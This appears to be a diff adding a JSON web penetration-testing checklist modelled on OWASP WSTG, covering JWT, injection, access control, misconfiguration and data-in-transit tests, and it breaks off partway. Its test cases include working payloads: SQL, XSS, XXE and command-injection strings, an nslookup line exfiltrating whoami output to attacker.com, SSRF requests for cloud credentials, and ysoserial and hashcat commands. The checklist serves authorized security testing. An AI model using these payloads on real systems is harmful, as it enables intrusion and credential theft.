+          "JWT after logout: token still validates? (Server must blacklist or use short-lived tokens)",
+          "Test session expiry: wait beyond session timeout → old cookie still works?",
+          "Test: refresh access token after logout → should fail"
+        ],
+        "expected": "Session token invalidated server-side on logout. Old tokens return 401. JWT tokens added to server denylist or short-lived (<15min).",
+        "tools": [
+          "Burp Repeater"
+        ],
+        "cwe": [
+          "CWE-613"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-SESS-10",
+        "name": "JWT Testing",
+        "sev": "critical",
+        "how": "Test JWT implementation for algorithm confusion, weak secrets, claim manipulation, and missing validation.",
+        "cases": [
+          "Decode at jwt.io → inspect header algorithm and payload claims",
+          "alg:none attack: change \"alg\":\"HS256\" → \"alg\":\"none\", remove signature → submit",
+          "Change payload claims: role:user → role:admin, isAdmin:false → isAdmin:true",
+          "RS256→HS256 confusion: sign token with server public key as HMAC secret",
+          "Brute force weak secret: hashcat -a 0 -m 16500 token.txt rockyou.txt",
+          "jwt_tool -T token.txt — automated JWT attacks (tamper all options)",
+          "Expired token (exp claim in past): server should reject",
+          "kid header injection: \"kid\":\"../../appsettings.json\" → path traversal in key lookup",
+          "Null signature: submit token with empty signature field"
+        ],
+        "expected": "JWT uses RS256 or ES256. alg:none rejected. Claims cannot be tampered. Expired tokens rejected. No weak HMAC secret.",
+        "tools": [
+          "jwt.io",
+          "jwt_tool",
+          "hashcat",
+          "Burp JWT Editor extension"
+        ],
+        "cwe": [
+          "CWE-347"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "P4",
+    "name": "Injection Testing",
+    "items": [
+      {
+        "id": "WSTG-INPV-05",
+        "name": "SQL Injection",
+        "sev": "critical",
+        "how": "Test all input parameters for SQL injection using manual probes, blind techniques, and automated tools. Test EVERY vector.",
+        "cases": [
+          "Add ' to every input field → look for DB errors (Incorrect syntax near..., ORA-, MySQL error)",
+          "Error-based: ' ORDER BY 100-- (reveals column count via error)",
+          "Boolean: ' AND 1=1-- (true response) vs ' AND 1=2-- (false) → compare content/length",
+          "MSSQL time-based: '; WAITFOR DELAY '0:0:5'-- (5 second delay)",
+          "MySQL time-based: ' AND SLEEP(5)--",
+          "Test ALL vectors: URL params, POST body, cookies, headers (User-Agent, Referer, X-Forwarded-For)",
+          "sqlmap -u 'https://target.com/page?id=1' --batch --dbs --level=3 --risk=2",
+          "sqlmap POST: sqlmap -u URL --data='param=value&id=1' --batch",
+          "Out-of-band: sqlmap --technique=E (DNS exfil via xp_dirtree)",
+          "Second-order SQLi: inject payload that executes when data is used later"
+        ],
+        "expected": "No SQL injection. Parameterized queries/ORM used throughout. All errors generic (no DB-specific messages).",
+        "tools": [
+          "sqlmap",
+          "Burp Intruder",
+          "OWASP ZAP Active Scan",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-89"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-01",
+        "name": "Reflected XSS",
+        "sev": "high",
+        "how": "Inject XSS payloads into all reflected inputs: URL params, search, error messages, header-reflected values.",
+        "cases": [
+          "<script>alert(1)</script> in every GET/POST param",
+          "\"><img src=x onerror=alert(1)> — attribute context breakout",
+          "<svg onload=alert(1)> — HTML5 SVG vector",
+          "javascript:alert(1) — href/src attribute injection",
+          "Case bypass: <ScRiPt>alert(1)</ScRiPt>",
+          "Double encoding: %253Cscript%253Ealert(1)%253C/script%253E",
+          "Test reflected HTTP headers: Referer, User-Agent, Accept-Language headers",
+          ".NET Request Validation bypass: %00<script>alert(1)</script>",
+          "XSStrike: xsstrike.py -u \"https://target.com/search?q=test\""
+        ],
+        "expected": "All user input HTML-encoded before reflection. CSP without unsafe-inline. No XSS payload executes.",
+        "tools": [
+          "Burp Suite",
+          "OWASP ZAP",
+          "XSStrike",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-79"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-02",
+        "name": "Stored XSS",
+        "sev": "high",
+        "how": "Inject XSS into persistent fields and verify execution when rendered to other users or admins.",
+        "cases": [
+          "Store <script>alert(document.cookie)</script> in comment/note/bio fields",
+          "Store XSS in username/display name → fires when admin views user list",
+          "Store XSS in address, support ticket, shipping notes, feedback fields",
+          "Store XSS in fields shown in admin panel: user agent, IP, referrer logs",
+          "SVG file upload: <svg><script>alert(document.domain)</script></svg>",
+          "Stored XSS in email field if shown in admin UI: <script>...</script>@test.com",
+          "Test all user-controlled data that is later displayed to other users"
+        ],
+        "expected": "All stored input HTML-encoded before rendering. Stored XSS cannot execute in any context.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-79"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-CLNT-01",
+        "name": "DOM-Based XSS",
+        "sev": "high",
+        "how": "Inspect JavaScript for dangerous sinks receiving user-controlled data without sanitization.",
+        "cases": [
+          "Search JS for dangerous sinks: document.write, innerHTML, outerHTML, eval, setTimeout(str)",
+          "Search JS for sources: location.hash, location.search, location.href, document.URL, document.referrer",
+          "Test URL fragment: https://target.com/page#\"><img src=x onerror=alert(1)>",
+          "Test search param flowing to innerHTML: ?name=<img src=x onerror=alert(1)>",
+          "postMessage handlers: send crafted message to window → XSS in handler?",
+          "DevTools → Sources → search for innerHTML = | document.write( | eval("
+        ],
+        "expected": "No dangerous sinks receive unsanitized user input. textContent used over innerHTML. DOMPurify used if HTML needed.",
+        "tools": [
+          "Browser DevTools",
+          "Burp Suite",
+          "Manual source-to-sink tracing"
+        ],
+        "cwe": [
+          "CWE-79"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-12",
+        "name": "OS Command Injection",
+        "sev": "critical",
+        "how": "Test inputs that may reach OS commands: file names, IP fields, ping, DNS lookup, hostnames, scheduler.",
+        "cases": [
+          "Windows: & whoami | whoami ; whoami || whoami && whoami",
+          "Linux: ; id | id && id `id` $(id)",
+          "Blind Windows: & ping -n 5 127.0.0.1 (5-second delay = blind CMDi)",
+          "Blind Linux: ; sleep 5",
+          "OOB: ; nslookup $(whoami).attacker.com (use interactsh)",
+          "commix --url \"https://target.com/?field=INJECT_HERE\" --batch",
+          "Test ALL potentially OS-touching inputs: filename, hostname, IP, port, search, email subject, scheduler, report gen"
+        ],
+        "expected": "No OS command injection. User input never reaches system() / Process.Start(). Whitelist validation on OS-touching fields.",
+        "tools": [
+          "Burp Suite",
+          "commix",
+          "interactsh",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-78"
+        ],
+        "mitre": [
+          "T1059"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-18",
+        "name": "Server-Side Template Injection (SSTI)",
+        "sev": "critical",
+        "how": "Test template engine injection by injecting mathematical expressions that template engines evaluate.",
+        "cases": [
+          "{{7*7}} → if 49 in response: Jinja2 / Twig / Pebble",
+          "${7*7} → Java Freemarker / Velocity",
+          "<%= 7*7 %> → Ruby ERB",
+          "@(7*7) → .NET Razor template",
+          "#{7*7} → Thymeleaf (Java)",
+          "{{7*'7'}} → Twig differentiation (returns 7777777)",
+          "tplmap --url \"https://target.com/page?name=test\" — automated detection",
+          "Test ALL reflected inputs: name, subject, email body, template name, search, greeting"
+        ],
+        "expected": "Template expressions not evaluated. Input treated as literal string. No template engine processes user input.",
+        "tools": [
+          "tplmap",
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-94"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-19",
+        "name": "Server-Side Request Forgery (SSRF)",
+        "sev": "critical",
+        "how": "Test URL-accepting inputs to redirect server-side fetches to internal resources and cloud metadata.",
+        "cases": [
+          "Identify URL inputs: webhooks, image-by-URL, doc import, PDF gen, SSO callbacks, fetch-from-URL",
+          "Try: http://127.0.0.1 | http://localhost | http://[::1] (IPv6 loopback)",
+          "AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
+          "Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+          "Decimal IP bypass: http://2130706433 (= 127.0.0.1)",
+          "URL redirect chain: use open redirect on trusted domain",
+          "OOB SSRF: use interactsh URL in all URL-accepting fields",
+          ".NET NTLM leak via UNC: \\\\attacker.com\\share\\ (SMB-based SSRF)"
+        ],
+        "expected": "URL params validated against strict allowlist. Internal addresses blocked. Cloud metadata unreachable from web tier.",
+        "tools": [
+          "Burp Collaborator",
+          "interactsh",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-918"
+        ],
+        "mitre": [
+          "T1090"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-07",
+        "name": "XML External Entity (XXE) Injection",
+        "sev": "critical",
+        "how": "Inject malicious XML with external entity declarations into any XML-accepting input.",
+        "cases": [
+          "Find XML inputs: SOAP endpoints, XML file uploads, Content-Type: text/xml APIs",
+          "Basic XXE Windows: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+          "Basic XXE Linux: file:///etc/passwd",
+          "OOB XXE: <!ENTITY xxe SYSTEM \"http://attacker.interactsh.com/xxe\">",
+          "XXE via SVG upload: <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
+          "XXE in DOCX: inject into XML inside DOCX structure",
+          "PHP XXE: php://filter/convert.base64-encode/resource=/etc/passwd",
+          "Blind XXE via error: <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;"
+        ],
+        "expected": "XML external entity processing disabled. DOCTYPE processing disabled. XXE not possible.",
+        "tools": [
+          "Burp Suite",
+          "OWASP ZAP Active Scan",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-611"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-11",
+        "name": ".NET Deserialization / Code Injection",
+        "sev": "critical",
+        "how": "Test .NET deserialization endpoints for RCE via crafted serialized object payloads.",
+        "cases": [
+          "Check cookies/headers for Base64-encoded blobs that may be serialized objects",
+          "Test JSON inputs with $type: {\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework...\"}",
+          "Json.NET TypeNameHandling: add \"$type\" to any JSON body parameter",
+          "ViewState deserialization (MAC disabled): ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"whoami\"",
+          "ysoserial.net gadget chains: ActivitySurrogateSelector, TypeConfuseDelegate, ObjectDataProvider",
+          "Test WCF endpoints, .NET Remoting (.rem, .soap URLs)",
+          "Check for BinaryFormatter, SoapFormatter, ObjectStateFormatter in error messages"
+        ],
+        "expected": "TypeNameHandling=None in Json.NET. BinaryFormatter not used. ViewState MAC enabled. No arbitrary type deserialization.",
+        "tools": [
+          "ysoserial.net",
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-502"
+        ],
+        "mitre": [
+          "T1059"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-06",
+        "name": "LDAP Injection",
+        "sev": "high",
+        "how": "Test authentication and search fields for LDAP injection — common in .NET apps using Active Directory authentication.",
+        "cases": [
+          "Login username field: *))(uid=*))(|(uid=*",
+          "Login: admin)(&)(",
+          "Login: )(|(password=*))",
+          "Search field: *(|(mail=*))",
+          "Test: does unexpected auth success occur?",
+          "Test: do error messages change format with injection chars?",
+          "Check .NET DirectorySearcher and PrincipalContext usage",
+          "Test both username AND password fields independently with LDAP chars"
+        ],
+        "expected": "LDAP queries use parameterized inputs or proper escaping. Injection characters treated as literals.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-90"
+        ],
+        "mitre": [
+          "T1190"
+        ]
+      },
+      {
+        "id": "WSTG-INPV-17",
+        "name": "Host Header Injection",
+        "sev": "medium",
+        "how": "Modify the HTTP Host header and observe if it is reflected in responses, reset emails, or cache.",
+        "cases": [
+          "Password reset: intercept → change Host: evil.com → check if reset link contains evil.com",
+          "Test X-Forwarded-Host: evil.com — same effect, often trusted by apps",
+          "Test X-Host: evil.com | X-Forwarded-Server: evil.com",
+          "Cache poisoning: Host header value cached and served to other users?",
+          "Test absolute URL construction using Host header",
+          "Inject port: Host: evil.com:8080 — does port appear in responses?"
+        ],
+        "expected": "Host header not used to construct links or redirect URLs. Application uses statically configured base URL.",
+        "tools": [
+          "Burp Repeater"
+        ],
+        "cwe": [
+          "CWE-20"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-INPV-20",
+        "name": "Mass Assignment",
+        "sev": "high",
+        "how": "Test if extra parameters submitted to model binding endpoints set unauthorized fields.",
+        "cases": [
+          "POST /api/users: {\"name\":\"test\",\"isAdmin\":true,\"role\":\"admin\",\"privilegeLevel\":5}",
+          "Registration: add POST param isAdmin=true alongside normal fields",
+          "Update profile: add userId=[other_user_id] to hijack another account",
+          "Purchase: add creditBalance=99999 to request body",
+          "PATCH /api/users/me: {\"id\":999,\"verified\":true,\"role\":\"admin\"}",
+          ".NET MVC: test [Bind] attribute enforcement — add extra properties to model"
+        ],
+        "expected": "Only explicitly whitelisted properties bound. [Bind(Include=...)] or DTOs used. Extra fields silently ignored.",
+        "tools": [
+          "Burp Repeater",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-915"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-INPV-15",
+        "name": "HTTP Request Smuggling",
+        "sev": "high",
+        "how": "Test for HTTP request smuggling between frontend proxy and backend server using conflicting length headers.",
+        "cases": [
+          "CL.TE: send both Content-Length and Transfer-Encoding: chunked headers",
+          "TE.CL: Transfer-Encoding handled by frontend, Content-Length by backend",
+          "Send: POST / HTTP/1.1 with Transfer-Encoding: chunked AND Content-Length: X",
+          "Test TE header obfuscation: Transfer-Encoding: xchunked | Transfer-Encoding : chunked",
+          "H2.CL downgrade: HTTP/2 frontend to HTTP/1.1 backend smuggling",
+          "Burp HTTP Request Smuggler extension | Manual crafting with \r\n sequences",
+          "Test for request queue poisoning: other users get your smuggled request"
+        ],
+        "expected": "No HTTP request smuggling possible. Frontend and backend agree on request message boundaries.",
+        "tools": [
+          "Burp HTTP Request Smuggler",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-444"
+        ],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P5",
+    "name": "Access Control",
+    "items": [
+      {
+        "id": "WSTG-ATHZ-04",
+        "name": "IDOR — Insecure Direct Object References",
+        "sev": "high",
+        "how": "Test all endpoints with resource IDs by substituting IDs of other users to access unauthorized resources.",
+        "cases": [
+          "GET /api/users/101/profile → change to /api/users/102/profile",
+          "GET /invoices/download?id=500 → try 499, 501, 1, 100",
+          "POST /api/messages?to=101 → change to to=102",
+          "Test ALL ID formats: sequential int, GUID, UUID, Base64, hashed IDs",
+          "Burp Intruder: iterate ID range → compare response body sizes",
+          "Two test accounts: User A tries to access User B resources via ID substitution",
+          "Test indirect refs: document names, emails, usernames as identifiers",
+          "Predictable GUIDs: some use timestamp-based GUIDs (UUIDv1) — test sequential"
+        ],
+        "expected": "All resource access enforced server-side by session identity. ID substitution returns 403. IDOR not possible.",
+        "tools": [
+          "Burp Intruder",
+          "Autorize (Burp extension)",
+          "Manual — 2 accounts"
+        ],
+        "cwe": [
+          "CWE-639"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "WSTG-ATHZ-03",
+        "name": "Vertical Privilege Escalation",
+        "sev": "critical",
+        "how": "Test if a low-privilege user can access admin functionality by navigating to admin URLs or calling admin API endpoints.",
+        "cases": [
+          "Browse to /admin, /administrator, /manage, /cms while logged as low-priv user — 403?",
+          "Call admin API: POST /api/admin/users | GET /api/admin/reports | DELETE /api/admin/users/1",
+          "JWT: decode → change role:user → role:admin → re-sign → resubmit",
+          "Swap session cookies: admin cookie → regular user → can they access admin page?",
+          "Test every admin function: create user, delete user, change roles, view audit logs",
+          "Test API: does admin-only endpoint accept low-privilege JWT token?",
+          "Role parameter manipulation: ?role=admin, &userType=admin added to requests"
+        ],
+        "expected": "Admin functions return 403 for non-admin users regardless of URL access method. RBAC enforced server-side only.",
+        "tools": [
+          "Burp Suite",
+          "Autorize extension",
+          "Manual",
+          "jwt.io"
+        ],
+        "cwe": [
+          "CWE-269"
+        ],
+        "mitre": [
+          "T1548"
+        ]
+      },
+      {
+        "id": "WSTG-ATHZ-02",
+        "name": "Authorization Schema Bypass",
+        "sev": "high",
+        "how": "Test various bypass techniques: method switching, path manipulation, special headers.",
+        "cases": [
+          "HTTP method switch: POST→GET on admin endpoint — does GET bypass auth check?",
+          "Path case: /ADMIN vs /admin — case-sensitive routing?",
+          "Path encoding: /admin%2f | /admin%09 | /admin/../admin",
+          "Add: X-Original-URL: /admin header",
+          "Add: X-Rewrite-URL: /admin header",
+          "Test old API versions: /api/v1/ if /api/v2/ is protected",
+          "Path traversal in routing: /public/../admin",
+          "Content-Length: 0 bypass: some frameworks skip body parsing for empty bodies"
+        ],
+        "expected": "Authorization enforced regardless of HTTP method, URL encoding, or special headers.",
+        "tools": [
+          "Burp Repeater",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-863"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-ATHZ-01",
+        "name": "Path Traversal / Directory Traversal",
+        "sev": "high",
+        "how": "Test file path parameters for directory traversal to read files outside the intended directory.",
+        "cases": [
+          "../../windows/win.ini in filename/path parameters",
+          "../../../etc/passwd",
+          "URL encoded: ..%2F..%2F..%2Fetc%2Fpasswd",
+          "Double encoded: %252e%252e%252f",
+          "Windows backslash: ..\\..\\windows\\win.ini",
+          "Null byte: ../../../etc/passwd%00.jpg",
+          "Mixed encoding: ....//....//etc/passwd",
+          ".NET: ..\\..\\web.config | ..%5C..%5Cweb.config",
+          "Absolute paths: /etc/passwd | C:\\windows\\win.ini",
+          "In download URLs: ?file=../../web.config | ?path=../appsettings.json"
+        ],
+        "expected": "File access restricted to intended directory. Traversal sequences blocked or stripped. Returns 400/403, not file contents.",
+        "tools": [
+          "Burp Repeater",
+          "dotdotpwn",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-22"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-ATHZ-05",
+        "name": "OAuth 2.0 Weaknesses",
+        "sev": "high",
+        "how": "Test OAuth authorization flows for state validation, redirect_uri bypass, and token security.",
+        "cases": [
+          "State param: remove state from auth request → CSRF on OAuth flow possible?",
+          "State reuse: use a previously seen state value → accepted?",
+          "redirect_uri manipulation: ?redirect_uri=https://evil.com",
+          "redirect_uri prefix match: /callback/../../evil",
+          "redirect_uri: open redirect: https://legit.com.evil.com/callback",
+          "Authorization code replay: use auth code twice → second use must fail",
+          "Scope escalation: add scope=admin to auth request → granted?",
+          "PKCE bypass: remove code_challenge param → PKCE still enforced?",
+          "Implicit flow: access_token in URL fragment → Referer header leaks it?"
+        ],
+        "expected": "State param validated and bound to session. redirect_uri strictly validated. Auth codes single-use. PKCE enforced.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-601",
+          "CWE-352"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CLNT-09",
+        "name": "Clickjacking",
+        "sev": "medium",
+        "how": "Test if the application can be embedded in an iframe on an attacker-controlled page.",
+        "cases": [
+          "Check response headers: X-Frame-Options: DENY or SAMEORIGIN present?",
+          "Check CSP: frame-ancestors directive set?",
+          "Test page: <iframe src=\"https://target.com/login\" width=\"800\" height=\"600\"></iframe> — renders?",
+          "Test all sensitive pages: login, settings, transfer, admin functions",
+          "framebusting JS present? (fragile — CSP preferred)",
+          "Test SAMEORIGIN: does it apply consistently across all pages?"
+        ],
+        "expected": "X-Frame-Options: DENY or SAMEORIGIN on all pages. CSP frame-ancestors set. Application cannot be framed by external sites.",
+        "tools": [
+          "Browser",
+          "Manual HTML test page"
+        ],
+        "cwe": [
+          "CWE-1021"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CLNT-07",
+        "name": "CORS Misconfiguration",
+        "sev": "high",
+        "how": "Test Cross-Origin Resource Sharing policy for overly permissive origins.",
+        "cases": [
+          "Add Origin: https://evil.com header → check Access-Control-Allow-Origin response",
+          "If response: Access-Control-Allow-Origin: https://evil.com = CORS vulnerability",
+          "Test null origin: Origin: null → Access-Control-Allow-Origin: null = vulnerable",
+          "Wildcard: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true = critical",
+          "Regex bypass: Origin: https://target.com.evil.com → accepted?",
+          "Subdomain bypass: Origin: https://evil.target.com → accepted (subdomain trust)?",
+          "Pre-flight OPTIONS: check permissive methods and headers allowed"
+        ],
+        "expected": "CORS allows only explicitly trusted origins. No wildcard with credentials. Null origin rejected.",
+        "tools": [
+          "Burp Repeater",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-942"
+        ],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P6",
+    "name": "Security Misconfigurations",
+    "items": [
+      {
+        "id": "WSTG-CONF-07",
+        "name": "HTTP Security Headers Audit",
+        "sev": "medium",
+        "how": "Check all HTTP response headers for security headers presence and correct configuration.",
+        "cases": [
+          "Strict-Transport-Security: max-age>=31536000; includeSubDomains; preload",
+          "Content-Security-Policy: defined, no unsafe-inline, no unsafe-eval, no wildcard script-src",
+          "X-Frame-Options: DENY or SAMEORIGIN (or CSP frame-ancestors)",
+          "X-Content-Type-Options: nosniff — prevent MIME sniffing",
+          "Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
+          "Permissions-Policy: restrict camera, microphone, geolocation",
+          "Server header: should NOT contain version (Microsoft-IIS not Microsoft-IIS/10.0)",
+          "X-Powered-By: should NOT be present in any response",
+          "X-AspNet-Version: should NOT be present",
+          "Validate at: https://securityheaders.com — target grade A"
+        ],
+        "expected": "All security headers present. No version-disclosing headers. securityheaders.com grade A.",
+        "tools": [
+          "Burp Repeater",
+          "securityheaders.com",
+          "curl -I",
+          "OWASP ZAP"
+        ],
+        "cwe": [
+          "CWE-16"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CRYP-01",
+        "name": "TLS / SSL Configuration",
+        "sev": "high",
+        "how": "Test TLS configuration for weak protocols, weak ciphers, certificate validity, and known vulnerabilities.",
+        "cases": [
+          "testssl.sh target.com — comprehensive TLS audit",
+          "Check protocols: TLS 1.0, TLS 1.1, SSLv3 must be DISABLED",
+          "Cipher suites: RC4, DES, 3DES, EXPORT, ANON, NULL ciphers must be ABSENT",
+          "Certificate: expiry date check | CN/SAN domain match | chain completeness",
+          "Check: POODLE, BEAST, SWEET32, DROWN, HEARTBLEED, ROBOT vulnerability checks",
+          "nmap --script ssl-enum-ciphers -p 443 target.com",
+          "ssllabs.com/ssltest/ — target A+ rating",
+          "HSTS preload list status: check at hstspreload.org"
+        ],
+        "expected": "TLS 1.2 and 1.3 only. Strong cipher suites. Valid non-expired certificate. SSLLabs grade A+.",
+        "tools": [
+          "testssl.sh",
+          "nmap ssl scripts",
+          "ssllabs.com/ssltest/"
+        ],
+        "cwe": [
+          "CWE-326"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-ERRH-01",
+        "name": "Verbose Error Messages",
+        "sev": "medium",
+        "how": "Trigger application errors to check for stack traces, SQL errors, file paths, or internal details.",
+        "cases": [
+          "Add ' to inputs → SQL error messages? (Incorrect syntax near...)",
+          "404 page: check response body for framework details",
+          "Malformed JSON: send invalid JSON → inspect error response body",
+          "Wrong Content-Type: send XML to JSON endpoint → check error",
+          "Access /elmah.axd — must be 403 or 404 (error log)",
+          "Access /trace.axd — must be 403 or 404 (trace viewer)",
+          "Trigger NullReferenceException: send null values in required fields",
+          ".NET Yellow Screen of Death: trigger unhandled exception → stack trace?",
+          "Unicode/null bytes in inputs → exception disclosure?"
+        ],
+        "expected": "Generic user-friendly error messages only. No stack traces, SQL errors, file paths exposed. elmah.axd and trace.axd blocked.",
+        "tools": [
+          "Burp Repeater",
+          "Browser"
+        ],
+        "cwe": [
+          "CWE-209"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CONF-06",
+        "name": "HTTP Methods Testing",
+        "sev": "medium",
+        "how": "Test for dangerous or unnecessary HTTP methods enabled on the server.",
+        "cases": [
+          "OPTIONS / HTTP/1.1 — lists allowed methods",
+          "TRACE / HTTP/1.1 — Cross-Site Tracing (XST) risk if enabled",
+          "PUT /test-upload.html with content — arbitrary file upload?",
+          "DELETE /index.html — deletion possible?",
+          "CONNECT method — proxy abuse potential",
+          "Test on ALL discovered paths, not just /",
+          "nmap --script http-methods -p 443 target.com"
+        ],
+        "expected": "Only GET, POST, HEAD enabled on web pages. TRACE disabled (405). PUT/DELETE restricted to authenticated API only.",
+        "tools": [
+          "Burp Repeater",
+          "curl -X TRACE https://target.com/",
+          "nmap http-methods"
+        ],
+        "cwe": [
+          "CWE-16"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "CONF-NET-01",
+        "name": ".NET Specific Misconfigurations",
+        "sev": "high",
+        "how": "Test .NET/IIS-specific configuration issues: diagnostic endpoints, debug mode, config file access.",
+        "cases": [
+          "Access /elmah.axd → must be 403/404",
+          "Access /trace.axd → must be 403/404",
+          "Access /WebResource.axd → check assembly info leakage",
+          "Swagger in production: /swagger | /swagger/index.html | /api-docs — must be 403/404",
+          "Direct config access: /web.config | /appsettings.json | /appsettings.Development.json — must be 403",
+          "Source control: /.git/config | /.git/HEAD — must be 403/404",
+          "Debug artifacts: X-AspNet-Version header present? X-Powered-By present?",
+          "Test /App_Data/, /App_Code/ directory listing",
+          "Test /__browserLink/ (Visual Studio browser link residual)"
+        ],
+        "expected": "All diagnostic endpoints blocked. Config files not web-accessible. Debug headers suppressed. Swagger absent in production.",
+        "tools": [
+          "Browser",
+          "Burp Repeater",
+          "gobuster"
+        ],
+        "cwe": [
+          "CWE-16"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CONF-12",
+        "name": "Content Security Policy Analysis",
+        "sev": "medium",
+        "how": "Analyze the CSP header for weaknesses that allow XSS bypass.",
+        "cases": [
+          "Check for unsafe-inline in script-src → XSS protection bypassed",
+          "Check for unsafe-eval in script-src → eval() XSS possible",
+          "Wildcard source: script-src * or script-src https: → any HTTPS source allowed",
+          "data: URI in script-src → <script src=data:...> XSS",
+          "Missing object-src: * allows Flash/plugin-based XSS",
+          "Missing base-uri: allows <base href=https://evil.com> tag injection",
+          "Check whitelisted CDNs: jsonp callback endpoints or Angular libraries on CDN?",
+          "Report-Only CSP? → No protection, only reports",
+          "Evaluate at: https://csp-evaluator.withgoogle.com/"
+        ],
+        "expected": "No unsafe-inline/eval. Nonce or hash-based CSP. No wildcard script-src. object-src: none. base-uri restricted.",
+        "tools": [
+          "csp-evaluator.withgoogle.com",
+          "Burp",
+          "Browser DevTools Console"
+        ],
+        "cwe": [
+          "CWE-358"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CONF-11",
+        "name": "Cloud Storage Misconfiguration",
+        "sev": "high",
+        "how": "Test for exposed cloud storage buckets (S3, Azure Blob, GCS) with sensitive data.",
+        "cases": [
+          "Enumerate bucket names: company-name, company-prod, company-backup, company-dev, company-assets",
+          "AWS S3: curl https://company-name.s3.amazonaws.com/ — list bucket?",
+          "AWS S3 unauth: aws s3 ls s3://bucket-name --no-sign-request",
+          "Azure Blob: https://account.blob.core.windows.net/container/?restype=container&comp=list",
+          "GCS: https://storage.googleapis.com/bucket-name/",
+          "Find bucket names in HTML source, JS files, API responses",
+          "grayhatwarfare.com — search public bucket contents",
+          "s3scanner: s3scanner scan --bucket company-name"
+        ],
+        "expected": "No public buckets with sensitive data. All cloud storage requires authentication.",
+        "tools": [
+          "aws cli",
+          "az cli",
+          "gcloud",
+          "s3scanner",
+          "grayhatwarfare.com"
+        ],
+        "cwe": [
+          "CWE-284"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CONF-04",
+        "name": "Backup & Unreferenced Files",
+        "sev": "high",
+        "how": "Search for backup files, temporary files, and unreferenced resources in the web root.",
+        "cases": [
+          "web.config.bak | web.config.old | web.config~ | web.config.orig",
+          "appsettings.json.bak | appsettings.json.old | appsettings.Production.json",
+          "index.aspx.bak | default.aspx.bak | index.aspx~",
+          ".env | .env.backup | .env.production | .env.local",
+          "database.sql | db.sql | db_backup.sql | dump.sql | backup.zip",
+          ".git/config | .git/HEAD (source code repo exposed)",
+          "composer.lock | package-lock.json (exact dependency versions)",
+          "gobuster with SecLists common backup extensions wordlist"
+        ],
+        "expected": "No backup or temporary files accessible. Config files and source code not in web root.",
+        "tools": [
+          "gobuster",
+          "feroxbuster",
+          "ffuf",
+          "SecLists"
+        ],
+        "cwe": [
+          "CWE-538"
+        ],
+        "mitre": [
+          "T1552"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "P7",
+    "name": "Sensitive Data Exposure",
+    "items": [
+      {
+        "id": "WSTG-CRYP-03",
+        "name": "Sensitive Data in Transit",
+        "sev": "critical",
+        "how": "Verify all sensitive data is transmitted exclusively over encrypted channels, with no exceptions.",
+        "cases": [
+          "Proxy all traffic in Burp — any HTTP (not HTTPS) requests containing credentials or session tokens?",
+          "Load login page on HTTP — forces redirect to HTTPS before form appears?",
+          "Mixed content on HTTPS pages: HTTP resources (images, scripts, fonts) loaded?",
+          "API calls: do any send Bearer tokens over HTTP?",
+          "HSTS header on all subdomains? Check includeSubDomains flag",
+          "WebSocket: wss:// (encrypted) or ws:// (plaintext)?",
+          "Check HSTS preload list status for the domain"
+        ],
